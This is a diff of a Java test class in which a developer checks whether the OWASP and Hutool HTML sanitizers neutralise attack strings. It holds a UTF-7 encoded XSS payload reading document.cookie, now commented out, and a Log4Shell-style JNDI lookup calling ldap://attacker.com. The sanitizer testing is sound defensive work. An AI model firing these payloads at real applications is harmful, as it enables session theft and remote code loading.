@@ -20,7 +20,6 @@ import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
 import org.junit.jupiter.api.Assertions;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.extension.ExtendWith;
-import org.owasp.html.PolicyFactory;
 import org.owasp.html.Sanitizers;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.boot.test.context.SpringBootTest;
@@ -59,12 +58,20 @@ class EsTest {
 
 
     public static void main(String[] args) {
-        PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
-        String safeHTML = policy.sanitize("+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-");
-        System.out.println(safeHTML);
-        System.out.println(Sanitizers.FORMATTING.and(Sanitizers.FORMATTING).sanitize("+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-"));
-        System.out.println(HtmlUtil.unescape(safeHTML));
-        System.out.println(HtmlUtil.filter("+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-"));
+//        PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
+//        String safeHTML = policy.sanitize("+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-");
+//        System.out.println(safeHTML);
+//        System.out.println(Sanitizers.FORMATTING.and(Sanitizers.FORMATTING).sanitize("+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-"));
+//        System.out.println(HtmlUtil.unescape(safeHTML));
+//        System.out.println(HtmlUtil.filter("+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-"));
+//        Date dt1 = new Date(2017, 3, 31);
+//        Date dt2 = new Date(2017, 5, 14)Z
+//        System.out.println(dt2.after(dt1));
+        String filter = HtmlUtil.filter("${jndi:ldap://attacker.com/a}");
+        String sanitize = Sanitizers.FORMATTING.and(Sanitizers.LINKS).sanitize("${jndi:ldap://attacker.com/a}");
+        System.out.println(filter);
+        System.out.println(sanitize);
+
     }
 
     @Test
